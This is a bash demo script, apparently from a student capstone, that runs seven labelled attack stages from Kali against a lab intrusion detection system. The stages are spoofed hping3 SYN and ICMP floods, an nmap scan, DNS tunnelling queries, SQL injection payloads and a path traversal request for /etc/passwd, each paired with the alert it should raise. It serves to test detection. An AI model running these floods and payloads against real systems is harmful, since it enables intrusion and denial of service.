#!/bin/bash
# =============================================================================
# NetIDS Capstone Demo — Attack Sequence
# Run this from your Kali machine against the victim IDS
# Usage: sudo bash demo_attack.sh <victim-ip>
# Example: sudo bash demo_attack.sh 192.168.56.103
# =============================================================================

VICTIM="${1:-192.168.56.103}"
SUBNET="192.168.56"

# Spoofed attacker IPs shown in the IDS dashboard
IP1="185.220.101.45"   # Tor exit node (Germany)
IP2="45.33.32.156"     # Linode VPS (US)
IP3="95.173.136.70"    # Rostelecom (Russia)
IP4="116.228.112.26"   # China Telecom (China)
IP5="177.75.32.5"      # Brazil

RED='\033[91m'
YELLOW='\033[93m'
GREEN='\033[92m'
CYAN='\033[96m'
BOLD='\033[1m'
RESET='\033[0m'

banner() {
    echo -e "\n${CYAN}${BOLD}========================================${RESET}"
    echo -e "${CYAN}${BOLD}  $1${RESET}"
    echo -e "${CYAN}${BOLD}========================================${RESET}\n"
}

step()     { echo -e "${YELLOW}${BOLD}[*] $1${RESET}"; }
done_msg() { echo -e "${GREEN}${BOLD}[+] $1${RESET}"; }

echo -e "\n${BOLD}NetIDS Demo Attack Sequence${RESET}"
echo -e "Target: ${BOLD}${VICTIM}${RESET}"
echo -e "Press ENTER to start or Ctrl+C to abort..."
read

# -----------------------------------------------------------------------------
# 1. ICMP Sweep — IP1 (Tor exit node) — counts unique destination hosts (T1018)
# -----------------------------------------------------------------------------
banner "Stage 1/7 — ICMP Sweep from ${IP1} (T1018)"
step "Sending 35 ICMP echo requests spoofed from ${IP1} to ${VICTIM}..."
hping3 --icmp --count 35 --interval u200000 -a "$IP1" "$VICTIM" &>/dev/null
done_msg "ICMP sweep complete. Expected: ICMP_SWEEP_SUSPECTED MEDIUM then HIGH"
sleep 2

# -----------------------------------------------------------------------------
# 2. Port Scan — real Kali IP (nmap cannot spoof source easily)
# -----------------------------------------------------------------------------
banner "Stage 2/7 — Port Scan (T1046)"
step "Running nmap SYN scan across 50 ports..."
nmap -sS --max-rate 200 -p 1-50 "$VICTIM" -Pn
done_msg "Port scan complete. Expected: PORT_SCAN_SUSPECTED MEDIUM"
sleep 2

# -----------------------------------------------------------------------------
# 3. SYN Burst — IP2 (Linode VPS) — high rate SYN flood (T1498)
# -----------------------------------------------------------------------------
banner "Stage 3/7 — SYN Burst from ${IP2} (T1498)"
step "Sending 60 SYN packets spoofed from ${IP2}..."
hping3 -S -p 80 --count 60 --interval u100000 -a "$IP2" "$VICTIM"
done_msg "SYN burst complete. Expected: SYN_BURST_SUSPECTED MEDIUM then HIGH"
sleep 2

# -----------------------------------------------------------------------------
# 4. Lateral Movement — IP3 (Russian VPS) — SSH probing many hosts (T1021)
# -----------------------------------------------------------------------------
banner "Stage 4/7 — Lateral Movement from ${IP3} (T1021)"
step "Sending 25 SSH SYN packets spoofed from ${IP3} to ${VICTIM}..."
hping3 -S -p 22 --count 25 --interval u300000 -a "$IP3" "$VICTIM" &>/dev/null
done_msg "Lateral movement complete. Expected: LATERAL_MOVEMENT_SUSPECTED MEDIUM then HIGH"
sleep 2

# -----------------------------------------------------------------------------
# 5. DNS Tunneling — real Kali IP (UDP needs real source for responses)
# -----------------------------------------------------------------------------
banner "Stage 5/7 — DNS Tunneling (T1071.004)"
step "Sending 50 rapid DNS queries..."
for i in $(seq 1 50); do
    dig @"$VICTIM" "query${i}.example.com" +time=1 +tries=1 &>/dev/null &
done
wait
done_msg "DNS rate flood complete. Expected: DNS_TUNNEL_SUSPECTED MEDIUM"
sleep 1

step "Sending long-subdomain query (data exfiltration pattern)..."
LONG_NAME=$(python3 -c "print('A'*76)")
dig @"$VICTIM" "${LONG_NAME}.tunnel.example.com" +time=1 +tries=1 &>/dev/null
done_msg "Long DNS query sent. Expected: DNS_TUNNEL_SUSPECTED HIGH"
sleep 2

# -----------------------------------------------------------------------------
# 6. Web Exploit — real Kali IP — SQL injection + path traversal (T1190)
# -----------------------------------------------------------------------------
banner "Stage 6/7 — Web Exploit (T1190)"
step "Sending SQL injection payloads..."
curl -s -X POST "http://${VICTIM}:5000/login" \
    -d "username=admin' OR '1'='1&password=x" \
    --connect-timeout 2 &>/dev/null
curl -s "http://${VICTIM}:5000/login?id=1%20UNION%20SELECT%201,2,3--" \
    --connect-timeout 2 &>/dev/null
done_msg "SQL injection sent. Expected: WEB_EXPLOIT_SUSPECTED HIGH"
sleep 1

step "Sending path traversal payload..."
curl -s "http://${VICTIM}:5000/login?file=../../../../etc/passwd" \
    --connect-timeout 2 &>/dev/null
done_msg "Path traversal sent. Expected: WEB_EXPLOIT_SUSPECTED MEDIUM"
sleep 2

# -----------------------------------------------------------------------------
# 7. Slow Loris — IP5 (Brazil) — half-open TCP connections (T1499)
# -----------------------------------------------------------------------------
banner "Stage 7/7 — Slow Loris from ${IP5} (T1499)"
step "Opening 25 half-open TCP connections spoofed from ${IP5}..."
hping3 -S -p 80 --count 25 --interval u200000 -a "$IP5" "$VICTIM"
done_msg "Slow Loris simulation complete. Expected: SLOW_LORIS_SUSPECTED MEDIUM then HIGH"

# -----------------------------------------------------------------------------
# Done
# -----------------------------------------------------------------------------
echo -e "\n${GREEN}${BOLD}========================================${RESET}"
echo -e "${GREEN}${BOLD}  Demo complete.${RESET}"
echo -e "${GREEN}${BOLD}  7 attack types across 5 source IPs${RESET}"
echo -e "${GREEN}${BOLD}  Check IDS console and dashboard.${RESET}"
echo -e "${GREEN}${BOLD}========================================${RESET}\n"
